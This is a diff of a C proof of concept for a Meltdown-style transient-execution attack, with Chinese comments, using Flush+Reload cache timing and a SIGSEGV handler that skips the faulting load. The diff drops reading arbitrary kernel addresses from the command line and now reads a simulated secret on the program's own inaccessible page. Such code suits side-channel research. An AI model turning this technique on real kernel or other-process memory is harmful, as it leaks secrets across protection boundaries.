@@ -1,9 +1,3 @@
-/*
- * 先故意触发一次内核地址段错，在瞬态期间去指定内核地址偷数据
- *
- * 实验结果：无法窃取到字符串
- */
-
 #define _GNU_SOURCE
 
 #include <stdio.h>
@@ -15,13 +9,21 @@
 #include <ctype.h>
 #include <sched.h>
 #include <x86intrin.h>
+#include <sys/mman.h>
 #include "../utils/cache_instr.h"
 
 #define GAP 4096
-
 uint8_t channel[256 * GAP];
 int cache_hit_threshold = 400;
 
+/* 用户态缓冲区，用于存储最终“恢复”数据 */
+static unsigned char secret_buf[256] __attribute__((aligned(4096)));
+
+/* 模拟的受控“内核数据”区域 */
+static unsigned char *fake_kernel;
+static size_t page_size;
+
+/* Flush channel */
 void flush_cache()
 {
     for (int i = 0; i < 256; i++)
@@ -36,25 +38,26 @@ static void __attribute__((noinline)) victim(unsigned long secret_addr)
 {
     __asm__ volatile(
         "1:\n\t"
-        /* 放大投机窗口 */
+        /* 扩大瞬态窗口 */
         ".rept 300\n\t"
         "add $0x141, %%rax\n\t"
         ".endr\n\t"
 
-        /* 访问内核地址（故意触发异常），会导致段错误（SIGSEGV） */
+        /* 这条对不可访问地址的读取会触发 SIGSEGV */
+        "mov (%[kaddr]), %%rax\n\t"
 
-        /* 异常架构化前的瞬态执行，访问内核态 secret 地址并编码 */
+        /* 瞬态执行期间访问 secret 并编码到缓存 */
         "movzbl (%[saddr]), %%eax\n\t"
         "shl $12, %%rax\n\t"
         "movb (%[target], %%rax, 1), %%al\n\t"
 
-        /* 跳转到信号处理器的安全点 */
         ".globl stopspeculate\n\t"
         "stopspeculate:\n\t"
         "nop\n\t"
         :
         : [target] "r"(channel),
-          [saddr] "r"(secret_addr),
+          [saddr]  "r"(secret_addr),
+          [kaddr]  "r"(secret_addr)  // 访问模拟内核 secret
         : "rax", "cc", "memory");
 }
 
@@ -64,7 +67,7 @@ void cache_detect()
     int i, mix_i;
     register uint64_t time1, time2;
     volatile uint8_t *addr;
-    for (i = 0; i < 256; i++)
+    for (int i = 0; i < 256; i++)
     {
         mix_i = ((i * 167) + 13) & 255;
         addr = &channel[mix_i * GAP];
@@ -73,7 +76,7 @@ void cache_detect()
         maccess(addr);
         time2 = rdtscp();
 
-        if ((int)(time2 - time1) <= cache_hit_threshold)
+        if ((int)(time2-time1) <= cache_hit_threshold)
             results[mix_i]++;
     }
 }
@@ -81,7 +84,6 @@ void cache_detect()
 void sigsegv(int sig, siginfo_t *siginfo, void *context)
 {
     ucontext_t *ucontext = context;
-    /* set RIP to the address of our stopspeculate function */
     ucontext->uc_mcontext.gregs[REG_RIP] = (unsigned long)stopspeculate;
     return;
 }
@@ -99,22 +101,20 @@ int set_signal(void)
 int ReadOneByte(unsigned long addr)
 {
     int i, ret = 0, max = -1, maxi = -1;
-    static char buf[256];
 
     memset(results, 0, sizeof(results));
 
     for (i = 0; i < 1000; i++)
     {
         flush_cache();
-
         mfence();
 
         victim(addr);
 
         mfence();
-
         cache_detect();
     }
+
     for (i = 0; i < 256; i++)
     {
         if (results[i] && results[i] > max)
@@ -128,44 +128,40 @@ int ReadOneByte(unsigned long addr)
 
 int main(int argc, char *argv[])
 {
-    int ret, i;
-    unsigned long addr = 0, size = 0;
-
-    if (argc == 3 || argc == 4)
-    {
-        // 解析地址和大小
-        sscanf(argv[1], "%lx", &addr);
-        sscanf(argv[2], "%lx", &size);
-
-        // 如果有第三个参数，解析 cache_hit_threshold
-        if (argc == 4)
-        {
-            sscanf(argv[3], "%d", &cache_hit_threshold);
-        }
-    }
-    else
-    {
-        fprintf(stderr, "Usage: %s <hex_addr> <length> [cache_hit_threshold]\n", argv[0]);
-        return 1;
-    }
+    int i;
+    unsigned long addr;
+    size_t size;
 
     memset(channel, 1, sizeof(channel));
 
-    ret = set_signal();
-    if (ret != 0)
-    {
-        perror("set_signal");
+    if (set_signal() != 0) { perror("set_signal"); return 1; }
+
+    /* 创建受控模拟“内核数据”区域 */
+    page_size = 4096;
+    fake_kernel = mmap(NULL, page_size, PROT_NONE,
+                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if (fake_kernel == MAP_FAILED) {
+        perror("mmap");
         return 1;
     }
 
-    for (i = 0; i < size; i++)
+    /* 写入模拟秘密，先临时设置可写 */
+    mprotect(fake_kernel, page_size, PROT_READ | PROT_WRITE);
+    const char *msg = "FAKE_KERNEL_SECRET: CPU Test 123!\n";
+    memcpy(fake_kernel, msg, strlen(msg));
+    mprotect(fake_kernel, page_size, PROT_NONE); // 恢复不可访问
+    mfence();
+    addr = (unsigned long)fake_kernel;
+    size = strlen(msg);
+    printf("Using simulated kernel secret at 0x%lx (%lu bytes)\n", addr, size);
+
+    for (i = 0; i < (int)size; i++)
     {
-        ret = ReadOneByte(addr);
-        if (ret == -1)
-            ret = 0xff;
-        printf("read %lx = %x %c (score=%d/%d)\n",
-               addr, ret, isprint(ret) ? ret : ' ',
-               ret != 0xff ? results[ret] : 0,
+        int byte = ReadOneByte(addr);
+        if (byte == -1) byte = 0xff;
+        printf("read %lx = %02x %c (score=%d/%d)\n",
+               addr, byte, isprint(byte) ? byte : ' ',
+               byte != 0xff ? results[byte] : 0,
                1000);
         addr++;
     }
